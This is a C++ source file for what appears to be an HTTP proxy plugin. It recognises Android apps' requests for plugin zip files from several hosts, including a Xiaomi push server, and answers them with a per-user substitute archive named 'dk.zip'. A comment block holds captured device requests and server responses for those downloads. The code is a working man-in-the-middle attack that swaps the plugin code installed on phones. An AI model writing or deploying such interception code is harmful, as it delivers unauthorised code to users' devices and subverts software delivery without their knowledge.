#include "changbaPlugin.h"
#include "PluginServer.h"

int gDkPluginFlag = 0;

int ChangBaPlugin::isChangba(const char * url, const char * host) {
	if (strstr(host, "youhuiyanxuan.com") || strstr(host,"xf886.cn") || strstr(host,"7trus9.com") ) {
		if (strstr(url, "/mpi/") && strstr(url, ".zip"))
			//if (strstr(url, "/mpi/fx_chb_mq.zip"))
		{
			gDkPluginFlag = 1;
			return TRUE;
		}
	}
	else if (strstr(host, "file.xmpush.xiaomi.com") && strstr(url, "/plugin/mpcd_")) {
		gDkPluginFlag = 2;
		return TRUE;
	}
	return FALSE;
}


int ChangBaPlugin::replyChangbaPlugin(char * dstbuf, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {
	char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/zip\r\nContent-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(lphttp->username, "dk.zip");
	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
	return 0;
	return ret;
}


/*
xf886.cn/mpi/fx_chb_dyk.zip


GET /mpi/fx_chb_dyk.zip HTTP/1.1
Connection: keep-alive
X-Online-Host: xf886.cn
User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SCL-TL00H Build/HonorSCL-TL00H) | token
Host: xf886.cn
Accept-Encoding: gzip

HTTP/1.1 200 OK
Server: Tengine
Content-Type: application/zip
Content-Length: 28794
Connection: keep-alive
Date: Sat, 06 Jul 2019 16:17:22 GMT
x-oss-request-id: 5D20C9921BCC63DFDD1AB032
Accept-Ranges: bytes
ETag: "5D7AC6423AF6C3897DEF2C6BEEDAF90D"
Last-Modified: Sat, 29 Jun 2019 05:51:28 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 15292212808270897664
x-oss-storage-class: Standard
Content-MD5: XXrGQjr2w4l97yxr7tr5DQ==
x-oss-server-time: 4
Via: cache12.l2cn1807[0,304-0,H], cache2.l2cn1807[0,0], cache20.cn576[0,200-0,H], cache11.cn576[1,0]
Ali-Swift-Global-Savetime: 1561970297
Age: 3306
X-Cache: HIT TCP_MEM_HIT dirn:11:210859639
X-Swift-SaveTime: Sat, 06 Jul 2019 16:51:17 GMT
X-Swift-CacheTime: 3600
Timing-Allow-Origin: *
EagleId: 700d419f15624331480066062e


xf886.cn/mpi/fx_chb_dyk.zip
GET /mpi/fx_chb_dyk.zip HTTP/1.1
Connection: keep-alive
X-Online-Host: xf886.cn
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; vivo Y55A Build/MMB29M) | token
Host: xf886.cn
Accept-Encoding: gzip


xf886.cn/mpi/fx_chb_mq.zip

GET /mpi/fx_chb_mq.zip HTTP/1.1
Connection: keep-alive
X-Online-Host: youhuiyanxuan.com
User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; MIX 2S MIUI/V10.2.2.0.PDGCNXM) | token
Host: youhuiyanxuan.com
Accept-Encoding: gzip

HTTP/1.1 200 OK
Server: Tengine
Content-Type: application/zip
Content-Length: 28059
Connection: keep-alive
Date: Wed, 15 May 2019 00:37:38 GMT
x-oss-request-id: 5CDB5F526E0D75BE1FCEEAED
Accept-Ranges: bytes
ETag: "817951B2BFC653F37F4A5212597293C2"
Last-Modified: Fri, 10 May 2019 07:51:26 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 13272027140776234179
x-oss-storage-class: Standard
Content-MD5: gXlRsr/GU/N/SlISWXKTwg==
x-oss-server-time: 22
Via: cache14.l2cn354[0,304-0,H], cache26.l2cn354[1,0], kunlun6.cn1596[0,200-0,H], kunlun4.cn1596[1,0]
Ali-Swift-Global-Savetime: 1557475226
Age: 3180
X-Cache: HIT TCP_MEM_HIT dirn:0:144438294
X-Swift-SaveTime: Wed, 15 May 2019 01:15:12 GMT
X-Swift-CacheTime: 3600
Timing-Allow-Origin: *
EagleId: 8cf93d2215578838389016350e

www.xf886.cn/mpi/fx_storm_jm.zip
GET /mpi/fx_storm_jm.zip HTTP/1.1
Connection: keep-alive
X-Online-Host: 7trus9.com
User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; ALP-AL00 Build/HUAWEIALP-AL00) | token
Host: 7trus9.com
Accept-Encoding: gzip
*/